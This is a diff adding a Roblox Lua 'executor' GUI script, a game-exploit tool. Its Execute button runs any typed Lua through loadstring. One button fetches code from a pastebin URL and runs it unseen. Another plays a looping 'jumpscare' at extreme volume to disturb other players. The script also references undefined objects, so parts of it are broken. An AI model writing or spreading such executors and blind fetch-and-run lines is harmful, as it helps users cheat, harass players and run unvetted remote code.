@@ -1,0 +1,390 @@
+-- Gui to Lua
+-- Version: 3.3
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local MainFrame = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local ImageLabel = Instance.new("ImageLabel")
+local Executor = Instance.new("TextButton")
+local Executr = Instance.new("TextButton")
+local ExecutorFrame = Instance.new("Frame")
+local FrameK = Instance.new("Frame")
+local TextBox = Instance.new("TextBox")
+local Logo = Instance.new("TextButton")
+local del0 = Instance.new("TextButton")
+local Execute2 = Instance.new("TextButton")
+local Clear = Instance.new("TextButton")
+local Execute = Instance.new("TextButton")
+local Outputithink = Instance.new("TextBox")
+local AdminPanel = Instance.new("TextButton")
+local credit = Instance.new("TextButton")
+local File = Instance.new("TextButton")
+local close = Instance.new("TextButton")
+local bigger_dontwork = Instance.new("TextButton")
+local Remove = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.ResetOnSpawn = false
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.288775504, 0, 0.203557312, 0)
+Frame.Size = UDim2.new(0, 490, 0, 27)
+Frame.Active = true
+Frame.Draggable = true
+
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = Frame
+MainFrame.BackgroundColor3 = Color3.fromRGB(234, 234, 234)
+MainFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+MainFrame.BorderSizePixel = 0
+MainFrame.Position = UDim2.new(0, 0, 1, 0)
+MainFrame.Size = UDim2.new(0, 490, 0, 314)
+
+Title.Name = "Title"
+Title.Parent = Frame
+Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Title.BackgroundTransparency = 1.000
+Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Title.BorderSizePixel = 0
+Title.Position = UDim2.new(0.0279069766, 0, 0.148148149, 0)
+Title.Size = UDim2.new(0, 122, 0, 21)
+Title.Font = Enum.Font.SourceSans
+Title.Text = "Dominant Executor"
+Title.TextColor3 = Color3.fromRGB(0, 0, 0)
+Title.TextSize = 14.000
+Title.TextWrapped = true
+
+ImageLabel.Parent = Frame
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel.BorderSizePixel = 0
+ImageLabel.Position = UDim2.new(0.0139534883, 0, 0.222222224, 0)
+ImageLabel.Size = UDim2.new(0, 17, 0, 17)
+ImageLabel.Image = "rbxassetid://86102463824382"
+
+Executor.Name = "Executor"
+Executor.Parent = Frame
+Executor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Executor.BorderColor3 = Color3.fromRGB(124, 124, 124)
+Executor.Position = UDim2.new(0.0135440128, 0, 1.22222221, 0)
+Executor.Size = UDim2.new(0, 45, 0, 17)
+Executor.Font = Enum.Font.SourceSans
+Executor.Text = "Executor"
+Executor.TextColor3 = Color3.fromRGB(0, 0, 0)
+Executor.TextSize = 14.000
+
+Executr.Name = "Executor"
+Executr.Parent = Frame
+Executr.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Executr.BorderColor3 = Color3.fromRGB(124, 124, 124)
+Executr.Position = UDim2.new(0.0135440128, 0, 1.22222221, 0)
+Executr.Size = UDim2.new(0, 45, 0, 17)
+Executr.Font = Enum.Font.SourceSans
+Executr.Text = "Executor"
+Executr.TextColor3 = Color3.fromRGB(0, 0, 0)
+Executr.TextSize = 14.000
+Executr.MouseButton1Click:Connect(function()
+ExecutorFrame.Visible = true
+FrameK.Visible = true
+TextBox.Visible = true
+File.Visible = true
+Clear.Visible = true
+Execute.Visible = true
+Outputithink.Visible = true
+Logo.Visible = false
+end)
+
+ExecutorFrame.Name = "ExecutorFrame"
+ExecutorFrame.Parent = Frame
+ExecutorFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ExecutorFrame.BorderColor3 = Color3.fromRGB(124, 124, 124)
+ExecutorFrame.Position = UDim2.new(0.0139535712, 0, 1.85185182, 0)
+ExecutorFrame.Size = UDim2.new(0, 483, 0, 291)
+
+FrameK.Name = "FrameK"
+FrameK.Parent = ExecutorFrame
+FrameK.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+FrameK.BorderColor3 = Color3.fromRGB(124, 124, 124)
+FrameK.Position = UDim2.new(0.823655844, 0, 0.0526316017, 0)
+FrameK.Size = UDim2.new(0, 75, 0, 262)
+
+TextBox.Parent = ExecutorFrame
+TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.BorderColor3 = Color3.fromRGB(124, 124, 124)
+TextBox.Position = UDim2.new(0.013507559, 0, 0.0523059741, 0)
+TextBox.Size = UDim2.new(0, 385, 0, 155)
+TextBox.ClearTextOnFocus = false
+TextBox.Font = Enum.Font.SourceSans
+TextBox.MultiLine = true
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.TextSize = 14.000
+TextBox.TextWrapped = true
+TextBox.TextXAlignment = Enum.TextXAlignment.Left
+TextBox.TextYAlignment = Enum.TextYAlignment.Top
+
+Logo.Name = "Logo"
+Logo.Parent = ExecutorFrame
+Logo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Logo.BorderColor3 = Color3.fromRGB(124, 124, 124)
+Logo.Position = UDim2.new(0.0150537631, 0, 0.853383482, 0)
+Logo.Size = UDim2.new(0, 122, 0, 29)
+Logo.Font = Enum.Font.SourceSans
+Logo.Text = "Load Logo"
+Logo.TextColor3 = Color3.fromRGB(0, 0, 0)
+Logo.TextSize = 14.000
+Logo.MouseButton1Click:Connect(function()
+local gui = Instance.new("ScreenGui")
+gui.Name = "Dominant Executor Logo by EXPTR lel"
+gui.Parent = game.CoreGui
+
+local lel = Instance.new("ImageLabel")
+lel.Size = UDim2.new(0, 100, 0, 100) -- Se mantiene igual
+lel.Position = UDim2.new(-0.127, 0, 0.408, 0)
+lel.BackgroundTransparency = 1
+lel.Image = "rbxassetid://138300660715632"
+lel.Parent = gui
+
+local Ring = Instance.new("ImageLabel")
+Ring.Size = UDim2.new(1.15, 0, 1.15, 0) -- 15% más grande
+Ring.Position = UDim2.new(-0.075, 0, -0.075, 0) -- Ajustado para centrarlo
+Ring.BackgroundTransparency = 1
+Ring.Image = "rbxassetid://98802122905725"
+Ring.Parent = lel
+
+local Orbit = Instance.new("ImageLabel")
+Orbit.Size = UDim2.new(0, 21, 0, 21)
+Orbit.Position = UDim2.new(0, 0, 0, 10)
+Orbit.BackgroundTransparency = 1
+Orbit.Image = "rbxassetid://0"
+Orbit.Parent = Ring
+
+lel:TweenPosition(UDim2.new(0.458, 0, 0.408, 0), "Out", "Linear", 0.4, false)
+wait(3)
+lel:TweenPosition(UDim2.new(0, 9, 0, 190), "Out", "Sine", 0.7, false)
+
+while wait() do
+    Ring.Rotation = Ring.Rotation + 1
+    Orbit.Rotation = Orbit.Rotation - 1
+end
+end)
+
+del0.Name = "del0"
+del0.Size = UDim2.new(0, 122, 0, 29)
+del0.Position = UDim2.new(0.0150537631, 0, 0.731072545, 0)
+del0.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+del0.BorderColor3 = Color3.fromRGB(124, 124, 124)
+del0.Text = "POLARIA"
+del0.TextColor3 = Color3.new(0, 0, 0)
+del0.Font = Enum.Font.SourceSans
+del0.Parent = ExecutorFrame
+del0.TextSize = 14.000
+del0.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/88m8h9xk"))()("Copyright ERROR_CODE ECCS Co")
+end)
+
+Execute2.Name = "Execute2"
+Execute2.Parent = ExecutorFrame
+Execute2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Execute2.BorderColor3 = Color3.fromRGB(124, 124, 124)
+Execute2.Position = UDim2.new(0.0150537631, 0, 0.607911825, 0)
+Execute2.Size = UDim2.new(0, 122, 0, 29)
+Execute2.Font = Enum.Font.SourceSans
+Execute2.Text = "Obama jumpscare"
+Execute2.TextColor3 = Color3.fromRGB(0, 0, 0)
+Execute2.TextSize = 14.000
+Execute2.MouseButton1Click:Connect(function()
+local gui = Instance.new("ScreenGui")
+gui.Name = "Obama"
+gui.Parent = game.CoreGui
+
+local jump = Instance.new("ImageLabel")
+jump.Size = UDim2.new(0.9, 150, 0.9, 150)
+jump.Position = UDim2.new(0.0, 0, 0.0, -59)
+jump.BackgroundColor3 = Color3.new(0, 0, 0)
+jump.ImageColor3 = Color3.new(1, 1, 1)
+jump.Image = "rbxassetid://5643866"
+jump.ImageTransparency = 0
+jump.Parent = gui
+
+jump.BackgroundTransparency = 0 
+
+local jumpscareSound = Instance.new("Sound", workspace)
+jumpscareSound.Name = "JumpscareSound"
+jumpscareSound.Volume = 999
+jumpscareSound.Pitch = 1
+jumpscareSound.SoundId = "rbxassetid://9067444671"
+jumpscareSound:play()
+
+wait(5.7)
+jump.ImageTransparency = 0.1
+wait(0.02)
+jump.ImageTransparency = 0.2
+wait(0.02)
+jump.ImageTransparency = 0.3
+wait(0.02)
+jump.ImageTransparency = 0.4
+wait(0.02)
+jump.ImageTransparency = 0.5
+wait(0.02)
+jump.ImageTransparency = 0.6
+wait(0.02)
+jump.ImageTransparency = 0.7
+wait(0.02)
+jump.ImageTransparency = 0.8
+wait(0.02)
+jump.ImageTransparency = 0.9
+wait(0.02)
+jump.ImageTransparency = 1
+wait(3.5)
+jump.Image = "rbxassetid://17397008583"
+wait(0.01)
+jump.ImageTransparency = 0.9
+wait(0.01)
+jump.ImageTransparency = 0.8
+wait(0.01)
+jump.ImageTransparency = 0.7
+wait(0.01)
+jump.ImageTransparency = 0.6
+wait(0.01)
+jump.ImageTransparency = 0.5
+wait(0.01)
+jump.ImageTransparency = 0.4
+wait(0.01)
+jump.ImageTransparency = 0.3
+wait(0.01)
+jump.ImageTransparency = 0.2
+wait(0.01)
+jump.ImageTransparency = 0.1
+wait(0.01)
+jump.ImageTransparency = 0
+
+local jumpscareSound = Instance.new("Sound", workspace)
+jumpscareSound.Name = "JumpscareSound"
+jumpscareSound.Volume = 7
+jumpscareSound.Pitch = 1
+jumpscareSound.SoundId = "rbxassetid://131902818695416"
+jumpscareSound:play()
+jumpscareSound.Looped = true
+
+while wait() do
+wait(2.9)
+jump.Image = "rbxassetid://17397008583"
+wait(0.9)
+jump.Image = "rbxassetid://2050833946"
+local jumpscareSound = Instance.new("Sound", workspace)
+jumpscareSound.Name = "JumpscareSound"
+jumpscareSound.Volume = 15
+jumpscareSound.SoundId = "rbxassetid://5547866547"
+jumpscareSound:play()
+wait(1)
+jump.Image = "rbxassetid://17397008583"
+end
+end)
+
+Clear.Name = "Clear"
+Clear.Parent = ExecutorFrame
+Clear.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Clear.BorderColor3 = Color3.fromRGB(124, 124, 124)
+Clear.Position = UDim2.new(0.0150537631, 0, 0.731072545, 0)
+Clear.Size = UDim2.new(0, 122, 0, 29)
+Clear.Font = Enum.Font.SourceSans
+Clear.Text = "Clear"
+Clear.TextColor3 = Color3.fromRGB(0, 0, 0)
+Clear.TextSize = 14.000
+Clear.MouseButton1Click:Connect(function()
+TextBox.Text = ""
+end)
+
+Execute.Name = "Execute"
+Execute.Parent = ExecutorFrame
+Execute.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Execute.BorderColor3 = Color3.fromRGB(124, 124, 124)
+Execute.Position = UDim2.new(0.0150537631, 0, 0.607911825, 0)
+Execute.Size = UDim2.new(0, 122, 0, 29)
+Execute.Font = Enum.Font.SourceSans
+Execute.Text = "Execute"
+Execute.TextColor3 = Color3.fromRGB(0, 0, 0)
+Execute.TextSize = 14.000
+Execute.MouseButton1Click:Connect(function()
+assert(loadstring(TextBox.Text))()
+end)
+
+Outputithink.Name = "Outputithink"
+Outputithink.Parent = ExecutorFrame
+Outputithink.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Outputithink.BorderColor3 = Color3.fromRGB(124, 124, 124)
+Outputithink.Position = UDim2.new(0.29192546, 0, 0.604811013, 0)
+Outputithink.Size = UDim2.new(0, 250, 0, 101)
+Outputithink.Font = Enum.Font.SourceSans
+Outputithink.Text = "[IDE]:Sucessfully Executed The Script!"
+Outputithink.TextColor3 = Color3.fromRGB(0, 0, 0)
+Outputithink.TextSize = 14.000
+Outputithink.TextXAlignment = Enum.TextXAlignment.Left
+Outputithink.TextYAlignment = Enum.TextYAlignment.Top
+
+AdminPanel.Name = "AdminPanel"
+AdminPanel.Parent = Frame
+AdminPanel.BackgroundColor3 = Color3.fromRGB(218, 218, 218)
+AdminPanel.BorderColor3 = Color3.fromRGB(124, 124, 124)
+AdminPanel.Position = UDim2.new(0.105380744, 0, 1.22222221, 0)
+AdminPanel.Size = UDim2.new(0, 45, 0, 17)
+AdminPanel.Font = Enum.Font.SourceSans
+AdminPanel.Text = "Admin Panel"
+AdminPanel.TextColor3 = Color3.fromRGB(0, 0, 0)
+AdminPanel.TextSize = 11.000
+AdminPanel.MouseButton1Click:Connect(function()
+ExecutorFrame.Visible = true
+FrameK.Visible = false
+TextBox.Visible = false
+File.Visible = false
+Clear.Visible = false
+Execute.Visible = false
+Outputithink.Visible = false
+Logo.Visible = true
+del0.Visible = true
+Execute2.Visible = true
+end)
+
+credit.Name = "credit"
+credit.Parent = Frame
+credit.BackgroundColor3 = Color3.fromRGB(218, 218, 218)
+credit.BorderColor3 = Color3.fromRGB(124, 124, 124)
+credit.Position = UDim2.new(0.195213096, 0, 1.22222221, 0)
+credit.Size = UDim2.new(0, 45, 0, 17)
+credit.Font = Enum.Font.SourceSans
+credit.Text = "Credits"
+credit.TextColor3 = Color3.fromRGB(0, 0, 0)
+credit.TextSize = 14.000
+credit.MouseButton1Click:Connect(function()
+ExecutorFrame.Visible = true
+credit2.Visible = false
+ImageLa.Visible = false
+FrameK.Visible = false
+TextBox.Visible = false
+File.Visible = false
+Clear.Visible = false
+Execute.Visible = false
+Outputithink.Visible = false
+Logo.Visible = false
+end)
+
+File.Name = "File"
+File.Parent = ExecutorFrame
+File.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+File.BorderColor3 = Color3.fromRGB(124, 124, 124)
+File.Position = UDim2.new(0.0150537631, 0, 0.853383482, 0)
+File.Size = UDim2.new(0, 122, 0, 29)
+File.Font = Enum.Font.SourceSans
+File.Text = "File"
+File.TextColor3 = Color3.fromRGB(0, 0, 0)
+File.TextSize = 14.000
